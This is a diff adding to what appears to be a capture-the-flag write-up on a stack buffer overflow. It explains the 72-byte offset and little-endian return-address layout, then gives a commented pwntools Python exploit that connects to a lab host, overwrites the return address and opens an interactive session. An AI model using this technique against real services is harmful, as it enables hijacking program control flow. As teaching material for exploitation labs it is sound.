@@ -57,5 +57,41 @@ If we want to execute the buffer overflow attack to go into that specific funcit
 
 So we can input 72 characters (doesn't matter what character, we'll make it 'Z'). We get 72 because we need to overwrite the buffer, which is 64 bytes, and we also need to overwirte through the base pointer, which is 8 bytes (64 + 8 = 72). Then the next 8 bytes we write HAS to be the address we want the function to exit into.
 
-Also note: since this is popped like a stack, we need to write the address backwards as seen:
+Also note: since this is popped like a stack, we need to write the address backwards, for example we have the address ```0x40060d``` (also note this address is 3 bytes long so we have to add 0's in the front to make them, each digit that's shown in hex is equivalent to half a byte). Putting those 0's at the front will have no effect on what it represents, though adding it to the end will make it different. 
 
+So this is how the address looks like:
+```
+0x  00  00  00  00  00  40  06  0d
+    1st 2nd 3rd 4th 5th 6th 7th 8th byte
+```
+Writing it backwards will look like:
+```
+0x  0d  06  40  00  00  00  00  00 
+```
+
+So now we cam write an exploit. So this code is a little different, the netcat address is different (everytime I create a new VPN session the address changes) and the address to the funciton I have to jump to is different than the one in IDA, nevertheless, it's the same process.
+
+Here's my written exploit in python, it's pretty well commented out to help:
+```python
+# Exploit written to do a buffer overflow
+from pwn import *
+
+# Connect to the adderss and scan until after WOW: was scanned
+session = remote("10.67.0.1", 32532)
+session.recvuntil("WOW:")
+
+# the address variable will hold everything between WOW: and inculding the new line character which we remove with [:-1]
+address = session.recvuntil("\n")[:-1]
+
+# I just like to put print statements to make sure everything was inputted correctly
+print(address)
+
+# Either payload line works, the first just converts the address into int to later package into 64 byte address
+# The second line is writing the address manually, remember we have to write the address backwards
+# payload = "Z" * 72 + p64(int(address, 16))
+payload = "Z" * 72 + "\xf6\x05\x40" + "\x00" * 5
+
+# Sends the payload
+session.sendline(payload)
+session.interactive()
+```
